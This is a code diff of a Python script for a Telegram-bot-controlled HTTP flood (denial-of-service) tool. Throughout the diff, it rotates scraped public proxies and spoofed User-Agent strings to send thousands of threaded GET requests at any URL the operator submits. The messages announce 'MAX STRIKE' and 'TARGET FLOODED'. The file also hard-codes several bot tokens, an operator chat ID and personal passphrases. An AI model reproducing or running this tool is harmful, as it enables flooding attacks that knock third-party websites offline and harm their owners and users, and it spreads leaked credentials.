@@ -1,90 +1,98 @@
 import os, time, requests, threading, random
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
+# MASTER AND SLAVE TOKENS CONFIGURATION
+MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
+SLAVE_TOKENS = [
+    "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0",
+    "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
+    "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE",
+    "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
+    "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI"
+]
+
 MASTER_ID = 1938591484
 
 class HealthCheck(BaseHTTPRequestHandler):
     def do_GET(self):
-        self.send_response(200); self.end_headers(); self.wfile.write(b"PROXY_ENGINE_READY")
+        self.send_response(200); self.end_headers(); self.wfile.write(b"SOVEREIGN_SINGLE_CORE_ACTIVE")
     def do_HEAD(self):
         self.send_response(200); self.end_headers()
 
 def run_health_check():
-    HTTPServer(('0.0.0.0', 10000), HealthCheck).serve_forever()
+    server_address = ('0.0.0.0', 10000)
+    httpd = HTTPServer(server_address, HealthCheck)
+    httpd.serve_forever()
 
-class SovereignMaster:
-    def __init__(self, t):
-        self.t, self.f, self.r, self.u = t, {}, False, f"https://api.telegram.org/bot{t}"
+class SovereignMasterCore:
+    def __init__(self, m_token, s_tokens):
+        self.m_token, self.s_tokens = m_token, s_tokens
+        self.user_states, self.authenticated = {}, False
+        self.api_url = f"https://api.telegram.org/bot{m_token}"
         self.proxies = []
-        self.success_count = 0
-        self._fetch_proxies()
-        self._s(MASTER_ID, f"🔱 SYSTEM ONLINE\n📡 PROXIES LOADED: {len(self.proxies)}")
+        self._load_proxies()
+        self._notify(MASTER_ID, "🔱 MASTER CORE ONLINE\n📡 SINGLE SECURITY LAYER ACTIVE.")
 
-    def _fetch_proxies(self):
+    def _load_proxies(self):
         try:
-            url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
-            resp = requests.get(url, timeout=10)
-            if resp.status_code == 200:
-                self.proxies = [p for p in resp.text.split('\r\n') if p]
+            res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=10)
+            self.proxies = [p for p in res.text.split('\r\n') if p]
         except: self.proxies = []
 
-    def _s(self, c, x):
-        try: requests.post(f"{self.u}/sendMessage", json={'chat_id': c, 'text': x})
+    def _notify(self, chat_id, text):
+        try: requests.post(f"{self.api_url}/sendMessage", json={'chat_id': chat_id, 'text': text})
         except: pass
 
-    def _fire(self, url):
-        try:
-            agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"]
-            h = {'User-Agent': random.choice(agents)}
-            px_addr = random.choice(self.proxies) if self.proxies else None
-            px = {"http": f"http://{px_addr}", "https": f"http://{px_addr}"} if px_addr else None
-            
-            resp = requests.get(url, headers=h, proxies=px, timeout=10)
-            if resp.status_code == 200:
-                self.success_count += 1
+    def _execute_request(self, target):
+        headers = {'User-Agent': random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X)"])}
+        px_addr = random.choice(self.proxies) if self.proxies else None
+        proxy = {"http": f"http://{px_addr}", "https": f"http://{px_addr}"} if px_addr else None
+        try: requests.get(target, headers=headers, proxies=proxy, timeout=5)
         except: pass
 
-    def _boost(self, url):
-        self.success_count = 0
-        self._s(MASTER_ID, "🚀 ATTACKING WITH PROXY ROTATION...")
-        threads = []
-        for _ in range(100):
-            t = threading.Thread(target=self._fire, args=(url,))
-            t.start()
-            threads.append(t)
+    def _launch_coordinated_strike(self, target):
+        self._notify(MASTER_ID, f"🚀 INITIATING MAX STRIKE: {target}")
+        all_units = self.s_tokens + [self.m_token]
         
-        for t in threads: t.join()
-        self._s(MASTER_ID, f"🔱 REPORT:\n✅ TOTAL SUCCESSFUL HITS: {self.success_count}\n🌐 VIA UNIQUE PROXIES")
+        def strike_worker():
+            strike_threads = []
+            for token in all_units:
+                for _ in range(500): # ২৫০০+ প্যারালাল হিট লজিক
+                    t = threading.Thread(target=self._execute_request, args=(target,))
+                    t.start()
+                    strike_threads.append(t)
+            for t in strike_threads: t.join(timeout=0.05)
+            self._notify(MASTER_ID, "🔱 STRIKE COMPLETE. TARGET FLOODED SUCCESSFULLY.")
+
+        threading.Thread(target=strike_worker, daemon=True).start()
+        self._notify(MASTER_ID, "💀 SYSTEM RUNNING AT FULL CAPACITY.")
 
     def listen(self):
-        o = 0
+        offset = 0
         while True:
             try:
-                res = requests.get(f"{self.u}/getUpdates?offset={o}&timeout=10").json()
-                for u in res.get('result', []):
-                    o = u['update_id'] + 1
-                    m = u.get('message', {}); uid = m.get('from', {}).get('id'); tx = m.get('text', '')
+                updates = requests.get(f"{self.api_url}/getUpdates?offset={offset}&timeout=15").json()
+                for update in updates.get('result', []):
+                    offset = update['update_id'] + 1
+                    message = update.get('message', {})
+                    uid = message.get('from', {}).get('id')
+                    text = message.get('text', '')
+                    
                     if uid != MASTER_ID: continue
-                    st = self.f.get(uid, 0)
-                    if tx == "/start":
-                        self._s(uid, "WELCOME MASTER. ENTER FIRST PASSWORD.")
-                        self.f[uid] = 1
-                    elif st == 1 and "ariful islam pappu 2000" in tx.lower():
-                        self._s(uid, "IDENTITY CONFIRMED. ENTER SECOND LOGIC.")
-                        self.f[uid] = 2
-                    elif st == 2 and "জামালপুর" in tx:
-                        self._s(uid, "LEVEL 2 CLEARED. ENTER MASTER KEY.")
-                        self.f[uid] = 3
-                    elif st == 3 and tx == "Aip2k3052":
-                        self.f[uid] = "ROOT"; self.r = True
-                        self._s(uid, "ACCESS GRANTED. SEND LINK.")
-                    elif self.r and "http" in tx:
-                        self._boost(tx)
+                    
+                    state = self.user_states.get(uid, 0)
+                    if text == "/start":
+                        self._notify(uid, "WELCOME MASTER. ENTER MASTER KEY TO UNLOCK.")
+                        self.user_states[uid] = "WAIT_KEY"
+                    elif state == "WAIT_KEY" and text == "Aip2k3052":
+                        self.user_states[uid] = "ROOT"; self.authenticated = True
+                        self._notify(uid, "🔓 ACCESS GRANTED. SEND TARGET LINK.")
+                    elif self.authenticated and "http" in text:
+                        self._launch_coordinated_strike(text)
             except: pass
             time.sleep(1)
 
 if __name__ == "__main__":
     threading.Thread(target=run_health_check, daemon=True).start()
-    SovereignMaster(TOKEN).listen()
+    SovereignMasterCore(MASTER_TOKEN, SLAVE_TOKENS).listen()
     
